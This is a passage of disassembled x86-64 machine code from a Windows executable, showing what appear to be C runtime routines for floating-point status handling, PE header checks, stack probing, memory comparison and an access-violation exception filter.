   14000c4b9:	48 c1 e8 0c          	shr    $0xc,%rax
   14000c4bd:	f7 d0                	not    %eax
   14000c4bf:	33 41 08             	xor    0x8(%rcx),%eax
   14000c4c2:	83 e0 01             	and    $0x1,%eax
   14000c4c5:	31 41 08             	xor    %eax,0x8(%rcx)
   14000c4c8:	e8 e7 02 00 00       	call   0x14000c7b4
   14000c4cd:	48 8b d0             	mov    %rax,%rdx
   14000c4d0:	a8 01                	test   $0x1,%al
   14000c4d2:	74 08                	je     0x14000c4dc
   14000c4d4:	48 8b 4d 10          	mov    0x10(%rbp),%rcx
   14000c4d8:	83 49 0c 10          	orl    $0x10,0xc(%rcx)
   14000c4dc:	f6 c2 04             	test   $0x4,%dl
   14000c4df:	74 08                	je     0x14000c4e9
   14000c4e1:	48 8b 4d 10          	mov    0x10(%rbp),%rcx
   14000c4e5:	83 49 0c 08          	orl    $0x8,0xc(%rcx)
   14000c4e9:	f6 c2 08             	test   $0x8,%dl
   14000c4ec:	74 08                	je     0x14000c4f6
   14000c4ee:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000c4f2:	83 48 0c 04          	orl    $0x4,0xc(%rax)
   14000c4f6:	f6 c2 10             	test   $0x10,%dl
   14000c4f9:	74 08                	je     0x14000c503
   14000c4fb:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000c4ff:	83 48 0c 02          	orl    $0x2,0xc(%rax)
   14000c503:	f6 c2 20             	test   $0x20,%dl
   14000c506:	74 08                	je     0x14000c510
   14000c508:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000c50c:	83 48 0c 01          	orl    $0x1,0xc(%rax)
   14000c510:	8b 03                	mov    (%rbx),%eax
   14000c512:	b9 00 60 00 00       	mov    $0x6000,%ecx
   14000c517:	48 23 c1             	and    %rcx,%rax
   14000c51a:	74 3e                	je     0x14000c55a
   14000c51c:	48 3d 00 20 00 00    	cmp    $0x2000,%rax
   14000c522:	74 26                	je     0x14000c54a
   14000c524:	48 3d 00 40 00 00    	cmp    $0x4000,%rax
   14000c52a:	74 0e                	je     0x14000c53a
   14000c52c:	48 3b c1             	cmp    %rcx,%rax
   14000c52f:	75 30                	jne    0x14000c561
   14000c531:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000c535:	83 08 03             	orl    $0x3,(%rax)
   14000c538:	eb 27                	jmp    0x14000c561
   14000c53a:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000c53e:	83 20 fe             	andl   $0xfffffffe,(%rax)
   14000c541:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000c545:	83 08 02             	orl    $0x2,(%rax)
   14000c548:	eb 17                	jmp    0x14000c561
   14000c54a:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000c54e:	83 20 fd             	andl   $0xfffffffd,(%rax)
   14000c551:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000c555:	83 08 01             	orl    $0x1,(%rax)
   14000c558:	eb 07                	jmp    0x14000c561
   14000c55a:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000c55e:	83 20 fc             	andl   $0xfffffffc,(%rax)
   14000c561:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000c565:	81 e6 ff 0f 00 00    	and    $0xfff,%esi
   14000c56b:	c1 e6 05             	shl    $0x5,%esi
   14000c56e:	81 20 1f 00 fe ff    	andl   $0xfffe001f,(%rax)
   14000c574:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000c578:	09 30                	or     %esi,(%rax)
   14000c57a:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000c57e:	48 8b 75 38          	mov    0x38(%rbp),%rsi
   14000c582:	83 48 20 01          	orl    $0x1,0x20(%rax)
   14000c586:	83 7d 40 00          	cmpl   $0x0,0x40(%rbp)
   14000c58a:	74 33                	je     0x14000c5bf
   14000c58c:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000c590:	ba e1 ff ff ff       	mov    $0xffffffe1,%edx
   14000c595:	21 50 20             	and    %edx,0x20(%rax)
   14000c598:	48 8b 45 30          	mov    0x30(%rbp),%rax
   14000c59c:	8b 08                	mov    (%rax),%ecx
   14000c59e:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000c5a2:	89 48 10             	mov    %ecx,0x10(%rax)
   14000c5a5:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000c5a9:	83 48 60 01          	orl    $0x1,0x60(%rax)
   14000c5ad:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000c5b1:	21 50 60             	and    %edx,0x60(%rax)
   14000c5b4:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000c5b8:	8b 0e                	mov    (%rsi),%ecx
   14000c5ba:	89 48 50             	mov    %ecx,0x50(%rax)
   14000c5bd:	eb 48                	jmp    0x14000c607
   14000c5bf:	48 8b 4d 10          	mov    0x10(%rbp),%rcx
   14000c5c3:	41 b8 e3 ff ff ff    	mov    $0xffffffe3,%r8d
   14000c5c9:	8b 41 20             	mov    0x20(%rcx),%eax
   14000c5cc:	41 23 c0             	and    %r8d,%eax
   14000c5cf:	83 c8 02             	or     $0x2,%eax
   14000c5d2:	89 41 20             	mov    %eax,0x20(%rcx)
   14000c5d5:	48 8b 45 30          	mov    0x30(%rbp),%rax
   14000c5d9:	48 8b 08             	mov    (%rax),%rcx
   14000c5dc:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000c5e0:	48 89 48 10          	mov    %rcx,0x10(%rax)
   14000c5e4:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000c5e8:	83 48 60 01          	orl    $0x1,0x60(%rax)
   14000c5ec:	48 8b 55 10          	mov    0x10(%rbp),%rdx
   14000c5f0:	8b 42 60             	mov    0x60(%rdx),%eax
   14000c5f3:	41 23 c0             	and    %r8d,%eax
   14000c5f6:	83 c8 02             	or     $0x2,%eax
   14000c5f9:	89 42 60             	mov    %eax,0x60(%rdx)
   14000c5fc:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000c600:	48 8b 16             	mov    (%rsi),%rdx
   14000c603:	48 89 50 50          	mov    %rdx,0x50(%rax)
   14000c607:	e8 ec 00 00 00       	call   0x14000c6f8
   14000c60c:	33 d2                	xor    %edx,%edx
   14000c60e:	4c 8d 4d 10          	lea    0x10(%rbp),%r9
   14000c612:	8b cf                	mov    %edi,%ecx
   14000c614:	44 8d 42 01          	lea    0x1(%rdx),%r8d
   14000c618:	ff 15 22 0b 00 00    	call   *0xb22(%rip)        # 0x14000d140
   14000c61e:	48 8b 4d 10          	mov    0x10(%rbp),%rcx
   14000c622:	8b 41 08             	mov    0x8(%rcx),%eax
   14000c625:	a8 10                	test   $0x10,%al
   14000c627:	74 08                	je     0x14000c631
   14000c629:	48 0f ba 33 07       	btrq   $0x7,(%rbx)
   14000c62e:	8b 41 08             	mov    0x8(%rcx),%eax
   14000c631:	a8 08                	test   $0x8,%al
   14000c633:	74 08                	je     0x14000c63d
   14000c635:	48 0f ba 33 09       	btrq   $0x9,(%rbx)
   14000c63a:	8b 41 08             	mov    0x8(%rcx),%eax
   14000c63d:	a8 04                	test   $0x4,%al
   14000c63f:	74 08                	je     0x14000c649
   14000c641:	48 0f ba 33 0a       	btrq   $0xa,(%rbx)
   14000c646:	8b 41 08             	mov    0x8(%rcx),%eax
   14000c649:	a8 02                	test   $0x2,%al
   14000c64b:	74 08                	je     0x14000c655
   14000c64d:	48 0f ba 33 0b       	btrq   $0xb,(%rbx)
   14000c652:	8b 41 08             	mov    0x8(%rcx),%eax
   14000c655:	a8 01                	test   $0x1,%al
   14000c657:	74 05                	je     0x14000c65e
   14000c659:	48 0f ba 33 0c       	btrq   $0xc,(%rbx)
   14000c65e:	8b 01                	mov    (%rcx),%eax
   14000c660:	83 e0 03             	and    $0x3,%eax
   14000c663:	74 30                	je     0x14000c695
   14000c665:	83 e8 01             	sub    $0x1,%eax
   14000c668:	74 1f                	je     0x14000c689
   14000c66a:	83 e8 01             	sub    $0x1,%eax
   14000c66d:	74 0e                	je     0x14000c67d
   14000c66f:	83 f8 01             	cmp    $0x1,%eax
   14000c672:	75 28                	jne    0x14000c69c
   14000c674:	48 81 0b 00 60 00 00 	orq    $0x6000,(%rbx)
   14000c67b:	eb 1f                	jmp    0x14000c69c
   14000c67d:	48 0f ba 33 0d       	btrq   $0xd,(%rbx)
   14000c682:	48 0f ba 2b 0e       	btsq   $0xe,(%rbx)
   14000c687:	eb 13                	jmp    0x14000c69c
   14000c689:	48 0f ba 33 0e       	btrq   $0xe,(%rbx)
   14000c68e:	48 0f ba 2b 0d       	btsq   $0xd,(%rbx)
   14000c693:	eb 07                	jmp    0x14000c69c
   14000c695:	48 81 23 ff 9f ff ff 	andq   $0xffffffffffff9fff,(%rbx)
   14000c69c:	83 7d 40 00          	cmpl   $0x0,0x40(%rbp)
   14000c6a0:	74 07                	je     0x14000c6a9
   14000c6a2:	8b 41 50             	mov    0x50(%rcx),%eax
   14000c6a5:	89 06                	mov    %eax,(%rsi)
   14000c6a7:	eb 07                	jmp    0x14000c6b0
   14000c6a9:	48 8b 41 50          	mov    0x50(%rcx),%rax
   14000c6ad:	48 89 06             	mov    %rax,(%rsi)
   14000c6b0:	48 8b 5c 24 38       	mov    0x38(%rsp),%rbx
   14000c6b5:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   14000c6ba:	48 8b 7c 24 48       	mov    0x48(%rsp),%rdi
   14000c6bf:	48 83 c4 20          	add    $0x20,%rsp
   14000c6c3:	5d                   	pop    %rbp
   14000c6c4:	c3                   	ret
   14000c6c5:	cc                   	int3
   14000c6c6:	cc                   	int3
   14000c6c7:	cc                   	int3
   14000c6c8:	48 83 ec 28          	sub    $0x28,%rsp
   14000c6cc:	83 f9 01             	cmp    $0x1,%ecx
   14000c6cf:	74 15                	je     0x14000c6e6
   14000c6d1:	8d 41 fe             	lea    -0x2(%rcx),%eax
   14000c6d4:	83 f8 01             	cmp    $0x1,%eax
   14000c6d7:	77 18                	ja     0x14000c6f1
   14000c6d9:	e8 b2 92 ff ff       	call   0x140005990
   14000c6de:	c7 00 22 00 00 00    	movl   $0x22,(%rax)
   14000c6e4:	eb 0b                	jmp    0x14000c6f1
   14000c6e6:	e8 a5 92 ff ff       	call   0x140005990
   14000c6eb:	c7 00 21 00 00 00    	movl   $0x21,(%rax)
   14000c6f1:	48 83 c4 28          	add    $0x28,%rsp
   14000c6f5:	c3                   	ret
   14000c6f6:	cc                   	int3
   14000c6f7:	cc                   	int3
   14000c6f8:	40 53                	rex push %rbx
   14000c6fa:	48 83 ec 20          	sub    $0x20,%rsp
   14000c6fe:	e8 3d fc ff ff       	call   0x14000c340
   14000c703:	8b d8                	mov    %eax,%ebx
   14000c705:	83 e3 3f             	and    $0x3f,%ebx
   14000c708:	e8 4d fc ff ff       	call   0x14000c35a
   14000c70d:	8b c3                	mov    %ebx,%eax
   14000c70f:	48 83 c4 20          	add    $0x20,%rsp
   14000c713:	5b                   	pop    %rbx
   14000c714:	c3                   	ret
   14000c715:	cc                   	int3
   14000c716:	cc                   	int3
   14000c717:	cc                   	int3
   14000c718:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   14000c71d:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   14000c722:	57                   	push   %rdi
   14000c723:	48 83 ec 20          	sub    $0x20,%rsp
   14000c727:	48 8b da             	mov    %rdx,%rbx
   14000c72a:	48 8b f9             	mov    %rcx,%rdi
   14000c72d:	e8 0e fc ff ff       	call   0x14000c340
   14000c732:	8b f0                	mov    %eax,%esi
   14000c734:	89 44 24 38          	mov    %eax,0x38(%rsp)
   14000c738:	8b cb                	mov    %ebx,%ecx
   14000c73a:	f7 d1                	not    %ecx
   14000c73c:	81 c9 7f 80 ff ff    	or     $0xffff807f,%ecx
   14000c742:	23 c8                	and    %eax,%ecx
   14000c744:	23 fb                	and    %ebx,%edi
   14000c746:	0b cf                	or     %edi,%ecx
   14000c748:	89 4c 24 30          	mov    %ecx,0x30(%rsp)
   14000c74c:	80 3d 8d b2 00 00 00 	cmpb   $0x0,0xb28d(%rip)        # 0x1400179e0
   14000c753:	74 25                	je     0x14000c77a
   14000c755:	f6 c1 40             	test   $0x40,%cl
   14000c758:	74 20                	je     0x14000c77a
   14000c75a:	e8 f1 fb ff ff       	call   0x14000c350
   14000c75f:	eb 21                	jmp    0x14000c782
   14000c761:	c6 05 78 b2 00 00 00 	movb   $0x0,0xb278(%rip)        # 0x1400179e0
   14000c768:	8b 4c 24 30          	mov    0x30(%rsp),%ecx
   14000c76c:	83 e1 bf             	and    $0xffffffbf,%ecx
   14000c76f:	e8 dc fb ff ff       	call   0x14000c350
   14000c774:	8b 74 24 38          	mov    0x38(%rsp),%esi
   14000c778:	eb 08                	jmp    0x14000c782
   14000c77a:	83 e1 bf             	and    $0xffffffbf,%ecx
   14000c77d:	e8 ce fb ff ff       	call   0x14000c350
   14000c782:	8b c6                	mov    %esi,%eax
   14000c784:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   14000c789:	48 8b 74 24 48       	mov    0x48(%rsp),%rsi
   14000c78e:	48 83 c4 20          	add    $0x20,%rsp
   14000c792:	5f                   	pop    %rdi
   14000c793:	c3                   	ret
   14000c794:	40 53                	rex push %rbx
   14000c796:	48 83 ec 20          	sub    $0x20,%rsp
   14000c79a:	48 8b d9             	mov    %rcx,%rbx
   14000c79d:	e8 9e fb ff ff       	call   0x14000c340
   14000c7a2:	83 e3 3f             	and    $0x3f,%ebx
   14000c7a5:	0b c3                	or     %ebx,%eax
   14000c7a7:	8b c8                	mov    %eax,%ecx
   14000c7a9:	48 83 c4 20          	add    $0x20,%rsp
   14000c7ad:	5b                   	pop    %rbx
   14000c7ae:	e9 9d fb ff ff       	jmp    0x14000c350
   14000c7b3:	cc                   	int3
   14000c7b4:	48 83 ec 28          	sub    $0x28,%rsp
   14000c7b8:	e8 83 fb ff ff       	call   0x14000c340
   14000c7bd:	83 e0 3f             	and    $0x3f,%eax
   14000c7c0:	48 83 c4 28          	add    $0x28,%rsp
   14000c7c4:	c3                   	ret
   14000c7c5:	cc                   	int3
   14000c7c6:	cc                   	int3
   14000c7c7:	cc                   	int3
   14000c7c8:	cc                   	int3
   14000c7c9:	cc                   	int3
   14000c7ca:	cc                   	int3
   14000c7cb:	cc                   	int3
   14000c7cc:	cc                   	int3
   14000c7cd:	cc                   	int3
   14000c7ce:	cc                   	int3
   14000c7cf:	cc                   	int3
   14000c7d0:	4c 63 41 3c          	movslq 0x3c(%rcx),%r8
   14000c7d4:	45 33 c9             	xor    %r9d,%r9d
   14000c7d7:	4c 03 c1             	add    %rcx,%r8
   14000c7da:	4c 8b d2             	mov    %rdx,%r10
   14000c7dd:	41 0f b7 40 14       	movzwl 0x14(%r8),%eax
   14000c7e2:	45 0f b7 58 06       	movzwl 0x6(%r8),%r11d
   14000c7e7:	48 83 c0 18          	add    $0x18,%rax
   14000c7eb:	49 03 c0             	add    %r8,%rax
   14000c7ee:	45 85 db             	test   %r11d,%r11d
   14000c7f1:	74 1e                	je     0x14000c811
   14000c7f3:	8b 50 0c             	mov    0xc(%rax),%edx
   14000c7f6:	4c 3b d2             	cmp    %rdx,%r10
   14000c7f9:	72 0a                	jb     0x14000c805
   14000c7fb:	8b 48 08             	mov    0x8(%rax),%ecx
   14000c7fe:	03 ca                	add    %edx,%ecx
   14000c800:	4c 3b d1             	cmp    %rcx,%r10
   14000c803:	72 0e                	jb     0x14000c813
   14000c805:	41 ff c1             	inc    %r9d
   14000c808:	48 83 c0 28          	add    $0x28,%rax
   14000c80c:	45 3b cb             	cmp    %r11d,%r9d
   14000c80f:	72 e2                	jb     0x14000c7f3
   14000c811:	33 c0                	xor    %eax,%eax
   14000c813:	c3                   	ret
   14000c814:	cc                   	int3
   14000c815:	cc                   	int3
   14000c816:	cc                   	int3
   14000c817:	cc                   	int3
   14000c818:	cc                   	int3
   14000c819:	cc                   	int3
   14000c81a:	cc                   	int3
   14000c81b:	cc                   	int3
   14000c81c:	cc                   	int3
   14000c81d:	cc                   	int3
   14000c81e:	cc                   	int3
   14000c81f:	cc                   	int3
   14000c820:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000c825:	57                   	push   %rdi
   14000c826:	48 83 ec 20          	sub    $0x20,%rsp
   14000c82a:	48 8b d9             	mov    %rcx,%rbx
   14000c82d:	48 8d 3d cc 37 ff ff 	lea    -0xc834(%rip),%rdi        # 0x140000000
   14000c834:	48 8b cf             	mov    %rdi,%rcx
   14000c837:	e8 34 00 00 00       	call   0x14000c870
   14000c83c:	85 c0                	test   %eax,%eax
   14000c83e:	74 22                	je     0x14000c862
   14000c840:	48 2b df             	sub    %rdi,%rbx
   14000c843:	48 8b d3             	mov    %rbx,%rdx
   14000c846:	48 8b cf             	mov    %rdi,%rcx
   14000c849:	e8 82 ff ff ff       	call   0x14000c7d0
   14000c84e:	48 85 c0             	test   %rax,%rax
   14000c851:	74 0f                	je     0x14000c862
   14000c853:	8b 40 24             	mov    0x24(%rax),%eax
   14000c856:	c1 e8 1f             	shr    $0x1f,%eax
   14000c859:	f7 d0                	not    %eax
   14000c85b:	83 e0 01             	and    $0x1,%eax
   14000c85e:	eb 02                	jmp    0x14000c862
   14000c860:	33 c0                	xor    %eax,%eax
   14000c862:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000c867:	48 83 c4 20          	add    $0x20,%rsp
   14000c86b:	5f                   	pop    %rdi
   14000c86c:	c3                   	ret
   14000c86d:	cc                   	int3
   14000c86e:	cc                   	int3
   14000c86f:	cc                   	int3
   14000c870:	b8 4d 5a 00 00       	mov    $0x5a4d,%eax
   14000c875:	66 39 01             	cmp    %ax,(%rcx)
   14000c878:	75 1e                	jne    0x14000c898
   14000c87a:	48 63 51 3c          	movslq 0x3c(%rcx),%rdx
   14000c87e:	48 03 d1             	add    %rcx,%rdx
   14000c881:	81 3a 50 45 00 00    	cmpl   $0x4550,(%rdx)
   14000c887:	75 0f                	jne    0x14000c898
   14000c889:	33 c0                	xor    %eax,%eax
   14000c88b:	b9 0b 02 00 00       	mov    $0x20b,%ecx
   14000c890:	66 39 4a 18          	cmp    %cx,0x18(%rdx)
   14000c894:	0f 94 c0             	sete   %al
   14000c897:	c3                   	ret
   14000c898:	33 c0                	xor    %eax,%eax
   14000c89a:	c3                   	ret
   14000c89b:	cc                   	int3
   14000c89c:	48 83 ec 28          	sub    $0x28,%rsp
   14000c8a0:	4d 8b 41 38          	mov    0x38(%r9),%r8
   14000c8a4:	48 8b ca             	mov    %rdx,%rcx
   14000c8a7:	49 8b d1             	mov    %r9,%rdx
   14000c8aa:	e8 0d 00 00 00       	call   0x14000c8bc
   14000c8af:	b8 01 00 00 00       	mov    $0x1,%eax
   14000c8b4:	48 83 c4 28          	add    $0x28,%rsp
   14000c8b8:	c3                   	ret
   14000c8b9:	cc                   	int3
   14000c8ba:	cc                   	int3
   14000c8bb:	cc                   	int3
   14000c8bc:	40 53                	rex push %rbx
   14000c8be:	45 8b 18             	mov    (%r8),%r11d
   14000c8c1:	48 8b da             	mov    %rdx,%rbx
   14000c8c4:	41 83 e3 f8          	and    $0xfffffff8,%r11d
   14000c8c8:	4c 8b c9             	mov    %rcx,%r9
   14000c8cb:	41 f6 00 04          	testb  $0x4,(%r8)
   14000c8cf:	4c 8b d1             	mov    %rcx,%r10
   14000c8d2:	74 13                	je     0x14000c8e7
   14000c8d4:	41 8b 40 08          	mov    0x8(%r8),%eax
   14000c8d8:	4d 63 50 04          	movslq 0x4(%r8),%r10
   14000c8dc:	f7 d8                	neg    %eax
   14000c8de:	4c 03 d1             	add    %rcx,%r10
   14000c8e1:	48 63 c8             	movslq %eax,%rcx
   14000c8e4:	4c 23 d1             	and    %rcx,%r10
   14000c8e7:	49 63 c3             	movslq %r11d,%rax
   14000c8ea:	4a 8b 14 10          	mov    (%rax,%r10,1),%rdx
   14000c8ee:	48 8b 43 10          	mov    0x10(%rbx),%rax
   14000c8f2:	8b 48 08             	mov    0x8(%rax),%ecx
   14000c8f5:	48 8b 43 08          	mov    0x8(%rbx),%rax
   14000c8f9:	f6 44 01 03 0f       	testb  $0xf,0x3(%rcx,%rax,1)
   14000c8fe:	74 0b                	je     0x14000c90b
   14000c900:	0f b6 44 01 03       	movzbl 0x3(%rcx,%rax,1),%eax
   14000c905:	83 e0 f0             	and    $0xfffffff0,%eax
   14000c908:	4c 03 c8             	add    %rax,%r9
   14000c90b:	4c 33 ca             	xor    %rdx,%r9
   14000c90e:	49 8b c9             	mov    %r9,%rcx
   14000c911:	5b                   	pop    %rbx
   14000c912:	e9 69 4c ff ff       	jmp    0x140001580
   14000c917:	cc                   	int3
   14000c918:	cc                   	int3
   14000c919:	cc                   	int3
   14000c91a:	cc                   	int3
   14000c91b:	cc                   	int3
   14000c91c:	cc                   	int3
   14000c91d:	cc                   	int3
   14000c91e:	cc                   	int3
   14000c91f:	cc                   	int3
   14000c920:	cc                   	int3
   14000c921:	cc                   	int3
   14000c922:	cc                   	int3
   14000c923:	cc                   	int3
   14000c924:	cc                   	int3
   14000c925:	cc                   	int3
   14000c926:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000c92d:	00 00 00 
   14000c930:	48 83 ec 10          	sub    $0x10,%rsp
   14000c934:	4c 89 14 24          	mov    %r10,(%rsp)
   14000c938:	4c 89 5c 24 08       	mov    %r11,0x8(%rsp)
   14000c93d:	4d 33 db             	xor    %r11,%r11
   14000c940:	4c 8d 54 24 18       	lea    0x18(%rsp),%r10
   14000c945:	4c 2b d0             	sub    %rax,%r10
   14000c948:	4d 0f 42 d3          	cmovb  %r11,%r10
   14000c94c:	65 4c 8b 1c 25 10 00 	mov    %gs:0x10,%r11
   14000c953:	00 00 
   14000c955:	4d 3b d3             	cmp    %r11,%r10
   14000c958:	73 16                	jae    0x14000c970
   14000c95a:	66 41 81 e2 00 f0    	and    $0xf000,%r10w
   14000c960:	4d 8d 9b 00 f0 ff ff 	lea    -0x1000(%r11),%r11
   14000c967:	41 c6 03 00          	movb   $0x0,(%r11)
   14000c96b:	4d 3b d3             	cmp    %r11,%r10
   14000c96e:	75 f0                	jne    0x14000c960
   14000c970:	4c 8b 14 24          	mov    (%rsp),%r10
   14000c974:	4c 8b 5c 24 08       	mov    0x8(%rsp),%r11
   14000c979:	48 83 c4 10          	add    $0x10,%rsp
   14000c97d:	c3                   	ret
   14000c97e:	cc                   	int3
   14000c97f:	cc                   	int3
   14000c980:	cc                   	int3
   14000c981:	cc                   	int3
   14000c982:	cc                   	int3
   14000c983:	cc                   	int3
   14000c984:	cc                   	int3
   14000c985:	cc                   	int3
   14000c986:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000c98d:	00 00 00 
   14000c990:	48 2b d1             	sub    %rcx,%rdx
   14000c993:	49 83 f8 08          	cmp    $0x8,%r8
   14000c997:	72 22                	jb     0x14000c9bb
   14000c999:	f6 c1 07             	test   $0x7,%cl
   14000c99c:	74 14                	je     0x14000c9b2
   14000c99e:	66 90                	xchg   %ax,%ax
   14000c9a0:	8a 01                	mov    (%rcx),%al
   14000c9a2:	3a 04 11             	cmp    (%rcx,%rdx,1),%al
   14000c9a5:	75 2c                	jne    0x14000c9d3
   14000c9a7:	48 ff c1             	inc    %rcx
   14000c9aa:	49 ff c8             	dec    %r8
   14000c9ad:	f6 c1 07             	test   $0x7,%cl
   14000c9b0:	75 ee                	jne    0x14000c9a0
   14000c9b2:	4d 8b c8             	mov    %r8,%r9
   14000c9b5:	49 c1 e9 03          	shr    $0x3,%r9
   14000c9b9:	75 1f                	jne    0x14000c9da
   14000c9bb:	4d 85 c0             	test   %r8,%r8
   14000c9be:	74 0f                	je     0x14000c9cf
   14000c9c0:	8a 01                	mov    (%rcx),%al
   14000c9c2:	3a 04 11             	cmp    (%rcx,%rdx,1),%al
   14000c9c5:	75 0c                	jne    0x14000c9d3
   14000c9c7:	48 ff c1             	inc    %rcx
   14000c9ca:	49 ff c8             	dec    %r8
   14000c9cd:	75 f1                	jne    0x14000c9c0
   14000c9cf:	48 33 c0             	xor    %rax,%rax
   14000c9d2:	c3                   	ret
   14000c9d3:	1b c0                	sbb    %eax,%eax
   14000c9d5:	83 d8 ff             	sbb    $0xffffffff,%eax
   14000c9d8:	c3                   	ret
   14000c9d9:	90                   	nop
   14000c9da:	49 c1 e9 02          	shr    $0x2,%r9
   14000c9de:	74 37                	je     0x14000ca17
   14000c9e0:	48 8b 01             	mov    (%rcx),%rax
   14000c9e3:	48 3b 04 11          	cmp    (%rcx,%rdx,1),%rax
   14000c9e7:	75 5b                	jne    0x14000ca44
   14000c9e9:	48 8b 41 08          	mov    0x8(%rcx),%rax
   14000c9ed:	48 3b 44 11 08       	cmp    0x8(%rcx,%rdx,1),%rax
   14000c9f2:	75 4c                	jne    0x14000ca40
   14000c9f4:	48 8b 41 10          	mov    0x10(%rcx),%rax
   14000c9f8:	48 3b 44 11 10       	cmp    0x10(%rcx,%rdx,1),%rax
   14000c9fd:	75 3d                	jne    0x14000ca3c
   14000c9ff:	48 8b 41 18          	mov    0x18(%rcx),%rax
   14000ca03:	48 3b 44 11 18       	cmp    0x18(%rcx,%rdx,1),%rax
   14000ca08:	75 2e                	jne    0x14000ca38
   14000ca0a:	48 83 c1 20          	add    $0x20,%rcx
   14000ca0e:	49 ff c9             	dec    %r9
   14000ca11:	75 cd                	jne    0x14000c9e0
   14000ca13:	49 83 e0 1f          	and    $0x1f,%r8
   14000ca17:	4d 8b c8             	mov    %r8,%r9
   14000ca1a:	49 c1 e9 03          	shr    $0x3,%r9
   14000ca1e:	74 9b                	je     0x14000c9bb
   14000ca20:	48 8b 01             	mov    (%rcx),%rax
   14000ca23:	48 3b 04 11          	cmp    (%rcx,%rdx,1),%rax
   14000ca27:	75 1b                	jne    0x14000ca44
   14000ca29:	48 83 c1 08          	add    $0x8,%rcx
   14000ca2d:	49 ff c9             	dec    %r9
   14000ca30:	75 ee                	jne    0x14000ca20
   14000ca32:	49 83 e0 07          	and    $0x7,%r8
   14000ca36:	eb 83                	jmp    0x14000c9bb
   14000ca38:	48 83 c1 08          	add    $0x8,%rcx
   14000ca3c:	48 83 c1 08          	add    $0x8,%rcx
   14000ca40:	48 83 c1 08          	add    $0x8,%rcx
   14000ca44:	48 8b 0c 0a          	mov    (%rdx,%rcx,1),%rcx
   14000ca48:	48 0f c8             	bswap  %rax
   14000ca4b:	48 0f c9             	bswap  %rcx
   14000ca4e:	48 3b c1             	cmp    %rcx,%rax
   14000ca51:	1b c0                	sbb    %eax,%eax
   14000ca53:	83 d8 ff             	sbb    $0xffffffff,%eax
   14000ca56:	c3                   	ret
   14000ca57:	cc                   	int3
   14000ca58:	cc                   	int3
   14000ca59:	cc                   	int3
   14000ca5a:	cc                   	int3
   14000ca5b:	cc                   	int3
   14000ca5c:	cc                   	int3
   14000ca5d:	cc                   	int3
   14000ca5e:	cc                   	int3
   14000ca5f:	cc                   	int3
   14000ca60:	cc                   	int3
   14000ca61:	cc                   	int3
   14000ca62:	cc                   	int3
   14000ca63:	cc                   	int3
   14000ca64:	cc                   	int3
   14000ca65:	cc                   	int3
   14000ca66:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000ca6d:	00 00 00 
   14000ca70:	ff e0                	jmp    *%rax
   14000ca72:	cc                   	int3
   14000ca73:	cc                   	int3
   14000ca74:	cc                   	int3
   14000ca75:	cc                   	int3
   14000ca76:	cc                   	int3
   14000ca77:	cc                   	int3
   14000ca78:	cc                   	int3
   14000ca79:	cc                   	int3
   14000ca7a:	cc                   	int3
   14000ca7b:	cc                   	int3
   14000ca7c:	cc                   	int3
   14000ca7d:	cc                   	int3
   14000ca7e:	cc                   	int3
   14000ca7f:	cc                   	int3
   14000ca80:	cc                   	int3
   14000ca81:	cc                   	int3
   14000ca82:	cc                   	int3
   14000ca83:	cc                   	int3
   14000ca84:	cc                   	int3
   14000ca85:	cc                   	int3
   14000ca86:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000ca8d:	00 00 00 
   14000ca90:	ff 25 f2 07 00 00    	jmp    *0x7f2(%rip)        # 0x14000d288
   14000ca96:	cc                   	int3
   14000ca97:	cc                   	int3
   14000ca98:	cc                   	int3
   14000ca99:	cc                   	int3
   14000ca9a:	cc                   	int3
   14000ca9b:	cc                   	int3
   14000ca9c:	cc                   	int3
   14000ca9d:	cc                   	int3
   14000ca9e:	cc                   	int3
   14000ca9f:	cc                   	int3
   14000caa0:	40 55                	rex push %rbp
   14000caa2:	48 83 ec 20          	sub    $0x20,%rsp
   14000caa6:	48 8b ea             	mov    %rdx,%rbp
   14000caa9:	48 8b 01             	mov    (%rcx),%rax
   14000caac:	48 8b d1             	mov    %rcx,%rdx
   14000caaf:	8b 08                	mov    (%rax),%ecx
   14000cab1:	e8 e6 70 ff ff       	call   0x140003b9c
   14000cab6:	90                   	nop
   14000cab7:	48 83 c4 20          	add    $0x20,%rsp
   14000cabb:	5d                   	pop    %rbp
   14000cabc:	c3                   	ret
   14000cabd:	cc                   	int3
   14000cabe:	40 55                	rex push %rbp
   14000cac0:	48 8b ea             	mov    %rdx,%rbp
   14000cac3:	48 8b 01             	mov    (%rcx),%rax
   14000cac6:	33 c9                	xor    %ecx,%ecx
   14000cac8:	81 38 05 00 00 c0    	cmpl   $0xc0000005,(%rax)
   14000cace:	0f 94 c1             	sete   %cl
   14000cad1:	8b c1                	mov    %ecx,%eax
   14000cad3:	5d                   	pop    %rbp
   14000cad4:	c3                   	ret
   14000cad5:	cc                   	int3
   14000cad6:	40 53                	rex push %rbx
   14000cad8:	55                   	push   %rbp
